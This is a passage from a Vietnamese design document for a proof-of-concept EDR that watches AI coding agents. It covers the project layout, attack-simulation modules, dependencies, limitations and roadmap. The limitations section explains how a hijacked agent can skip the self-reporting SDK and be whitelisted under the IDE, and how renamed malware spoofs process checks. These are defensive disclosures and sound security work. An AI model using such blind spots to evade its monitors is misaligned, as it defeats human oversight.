│   └── dashboard.html               # Web UI (3 tabs: Graph / Timeline / Chain)
│
├── attack_simulation/
│   ├── demo_runner.py               # 8 kịch bản tấn công + SDK integration
│   ├── mock_web_agent.py            # AI Web Agent (Playwright)
│   ├── malicious_payload.py         # Payload simulation
│   ├── static_web_server.py         # Server phục vụ trang web độc hại
│   └── DEMO_CHEATSHEET.md           # Hướng dẫn demo + FAQ giám khảo
│
├── tests/                           # Unit Tests (41 tests)
│   ├── test_prompt_monitor.py       # 11 tests
│   ├── test_response_monitor.py     # 10 tests
│   ├── test_tool_monitor.py         #  7 tests
│   ├── test_risk_scoring.py         #  5 tests
│   └── test_correlation.py          #  9 tests
│
├── alert_queue/                     # Alert JSON files (runtime)
├── reports/                         # Incident Summary reports (runtime)
├── logs/                            # Thư mục chứa log & data feed
│   ├── dashboard_feed.jsonl         # Data stream cho Web Dashboard
│   └── edr_engine.log               # Log hệ thống EDR
├── requirements.txt                 # Dependencies
└── download_model.py                # Script tải model DeBERTa
```

---

## 16. DEPENDENCIES

```
pywin32==312        # Windows API: Named Pipe, Event Log
xmltodict==0.13.0   # Parse Sysmon XML events
psutil==5.9.8       # Process management (terminate)
colorama==0.4.6     # Terminal colors
neo4j               # Graph database driver
transformers        # HuggingFace NLP pipeline
torch               # PyTorch backend cho transformers
playwright          # Browser automation (mock web agent)
pyyaml              # Config file parser
```

---

## 17. GIỚI HẠN HIỆN TẠI & HƯỚNG KHẮC PHỤC

| Giới hạn | Mức độ | Hướng khắc phục |
|---|:---:|---|
| Chưa tích hợp API nội bộ Cursor | Cao | Bắt buộc chuyển sang Mandatory Hooking (LSP Proxy / eBPF) thay vì dùng SDK tự báo cáo. (Xem chi tiết bên dưới) |
| Lỗ hổng Process Spoofing (Rename Malware) | Cao | Yêu cầu thêm Path Validation (chỉ cho phép `C:\Program Files\...`) hoặc Authenticode Signature Verification để xác thực binary thật. |
| Chỉ hỗ trợ Windows | Cao | Linux: eBPF collector thay Sysmon |
| Không bảo vệ kernel-level threats | Thấp | Ngoài scope (EDR userspace) |
| Telemetry plaintext qua IPC | Trung bình | TLS/HMAC cho Named Pipe channel chống Local Spoofing |
| Dashboard SVG tĩnh | Thấp | Bổ sung Force-directed graph + zoom/pan với D3.js nâng cao |

**Lỗ hổng "Vùng mù" của Self-Reported Telemetry:**
Đây là giới hạn lớn nhất của kiến trúc PoC hiện tại. AI Telemetry được thu thập qua SDK (tự nguyện). Nếu AI Agent bị hack, nó có thể không gọi SDK để báo cáo hành vi. Khi đó, Sysmon vẫn bắt được hành vi độc hại nhưng `ParentImage` lại là IDE (vì agent chạy trong IDE) -> Bị Whitelist chặn -> Không sinh Incident.
*Cách khắc phục cấp Enterprise:* Chuyển mô hình từ "Voluntary SDK" sang "Mandatory Hooking" (theo dõi bắt buộc bằng eBPF hoặc proxy LSP ở tầng network nội bộ) để đảm bảo không một AI Agent nào lọt khỏi "tầm mắt" của EDR.

---

## 18. ĐỊNH HƯỚNG PHÁT TRIỂN

| Hạng mục | Mô tả | Độ ưu tiên |
|---|---|:---:|
| Native Cursor/Copilot Integration | Hook qua Extension API, LSP proxy | P0 |
| Process Binary Verification | Verify Authenticode Signature / Path thay vì chỉ check basename | P0 |
| Multi-Agent Telemetry | Agent federation, cross-session tracking | P1 |
| Linux eBPF Collector | Thay thế Sysmon trên Linux | P1 |
| LLM Investigation Assistant | Chatbot điều tra sự cố tự động tích hợp LLM | P2 |
| ML-based Anomaly Detection | Behavioral baseline + deviation scoring | P2 |
| IPC Encryption | TLS/HMAC cho telemetry channel | P2 |
| AMSI Integration | Giải mã PowerShell encoded commands | P2 |

---

## 19. KẾT LUẬN

Nền tảng **AI Runtime Threat Detection & Response Platform** mở rộng mô hình EDR truyền thống bằng cách kết hợp hai lớp quan sát:

- **AI Runtime Telemetry** — quan sát **ý định** (Intent Space) phát sinh từ AI Agent, bao gồm nội dung prompt, kết quả response và hành vi gọi tool. Ba monitor chuyên biệt (PromptMonitor, ToolMonitor, ResponseMonitor) phân tích real-time với weighted scoring.
- **System Telemetry** (Sysmon) — quan sát **hành động** (Action Space) thực sự xảy ra trên hệ điều hành, bao gồm Process Creation, Network Connection, File Create, Registry Modification, DNS Query.

Thông qua **Intent–Action Correlation**, hệ thống có khả năng phát hiện mối đe dọa ở hai tầng độc lập:

1. **Tầng Intent** — phát hiện Prompt Injection, Data Disclosure, Tool Anomaly ngay khi AI Agent nhận hoặc phản hồi prompt, **trước khi** hành động tác động xuống hệ điều hành. Đây là điểm khác biệt cốt lõi so với EDR truyền thống.
2. **Tầng Action** — liên kết với Sysmon events để xây dựng chuỗi tấn công đầy đủ khi intent đã biến thành hành động thực tế.

Hệ thống được thiết kế với các nguyên tắc kỹ thuật:
- **Event-driven architecture** với `queue.Queue` và fan-out pattern
- **Configurable** qua `config.yaml` duy nhất, không hardcode
- **Testable** với 41 unit tests covering 5 modules lõi
- **Observable** qua logging framework phân cấp + Dashboard 3 tabs
- **Resilient** với whitelist fail-safe, Neo4j fallback, graceful shutdown

Kết quả được trực quan hóa trên **Web Dashboard** thời gian thực (3 tabs: Incident Graph, Timeline, Attack Chain) và đồ thị quan hệ **Neo4j**, hỗ trợ điều tra Root Cause Analysis cho đội ngũ SOC.

Đây là nền tảng thực nghiệm cho hướng nghiên cứu **AI Runtime Security**, **AI Agent Threat Detection** và **AI Security Operations Platform** trong tương lai.

---

*Phiên bản 2.0 — Cập nhật: Config tập trung, False Positive fix, Risk Scoring 5 biến số, NLP 8 labels, Dashboard 3 tabs, Logging framework, 41 Unit Tests.*
